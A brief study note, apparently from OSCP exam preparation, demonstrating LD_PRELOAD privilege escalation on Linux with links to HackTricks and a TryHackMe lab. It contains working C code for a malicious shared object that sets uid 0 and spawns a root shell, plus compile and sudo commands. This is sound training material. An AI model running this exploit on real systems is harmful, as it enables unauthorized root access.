### 2024-04-25-Thu

# LD_PRELOAD & LD_LIBRARY_PATH

https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path

![image](https://github.com/r1skkam/OffSec-PEN-200-OSCP-Preparation/assets/58542375/819d4731-4246-4900-a7c4-afcf1941f852)

```
nano /tmp/pe.c
```

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

```
sudo LD_PRELOAD=./pe.so /usr/bin/ping
```

![image](https://github.com/r1skkam/OffSec-PEN-200-OSCP-Preparation/assets/58542375/06c07e02-d318-4e9c-a46e-a9fbcbe48ed7)

https://tryhackme.com/r/room/creative
